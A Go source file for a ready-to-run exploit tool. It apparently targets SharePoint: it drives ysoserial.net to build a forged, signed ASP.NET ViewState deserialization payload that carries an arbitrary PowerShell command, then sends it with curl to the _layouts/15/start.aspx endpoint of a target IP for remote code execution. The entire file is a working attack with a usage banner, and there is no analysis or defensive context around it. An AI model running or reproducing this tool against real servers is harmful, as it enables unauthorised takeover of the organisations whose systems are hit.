package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func generateViewStatePayload(command, pluginType, generator, validationKey, validationAlg string) string {
	var winePrefix []string
	if runtime.GOOS == "linux" {
		winePrefix = []string{"wine"}
	}

	args := append(winePrefix, []string{
		"Release/ysoserial.exe",
		"-p", pluginType,
		"-g", "TypeConfuseDelegate",
		"-c", fmt.Sprintf(`powershell -nop -c "%s"`, command),
		"--generator", generator,
		"--validationkey", validationKey,
		"--validationalg", validationAlg,
		"--islegacy",
		"--minify",
	}...)

	cmd := exec.Command(args[0], args[1:]...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Payload generation failed:")
		fmt.Println(string(output))
		return ""
	}

	return strings.TrimSpace(string(output))
}

func sendPayloadWithCurl(viewstatePayload, targetIP string) {
	targetURL := fmt.Sprintf("http://%s/_layouts/15/start.aspx", targetIP)
	fullURL := fmt.Sprintf("%s?__VIEWSTATE=%s", targetURL, viewstatePayload)
	fmt.Printf("[] Sending to: %s\n", fullURL)

	curlCmd := exec.Command("curl", "--verbose", "-s", "-X", "GET", fullURL,
		"-H", "User-Agent: curl/8.4.0",
		"-H", "Accept-Encoding: gzip, deflate, br",
		"-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"-H", "Connection: keep-alive")

	curlOutput, err := curlCmd.CombinedOutput()
	if err != nil {
		fmt.Println("Curl request failed:")
		fmt.Println(string(curlOutput))
		return
	}
	fmt.Println(string(curlOutput))
}

func main() {
	pluginType := flag.String("p", "", "Plugin type")
	generator := flag.String("g", "", "generator value")
	validationKey := flag.String("va", "", "Validation key")
	validationAlg := flag.String("alg", "", "Validation algorithm")
	command := flag.String("c", "", "Command to execute remotely")
	targetIP := flag.String("ip", "", "Target IP address")

	flag.Usage = func() {
		fmt.Println("Usage:")
		fmt.Println("  ./viewstate.exe -p <ysoserial.net pluginType> -g <generator> -va <validationKey> -alg <validationAlg> -c <command> -ip <targetIP>")
		fmt.Println("\nFlags:")
		flag.PrintDefaults()
	}

	flag.Parse()

	if *pluginType == "" || *generator == "" || *validationKey == "" || *validationAlg == "" || *command == "" || *targetIP == "" {
		fmt.Println("[!] Missing required parameters.")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Printf("[+] Generating payload for: %s\n", *command)
	payload := generateViewStatePayload(*command, *pluginType, *generator, *validationKey, *validationAlg)

	if payload != "" {
		sendPayloadWithCurl(payload, *targetIP)
	} else {
		fmt.Println("[!] Abort - payload generation failure")
	}
}
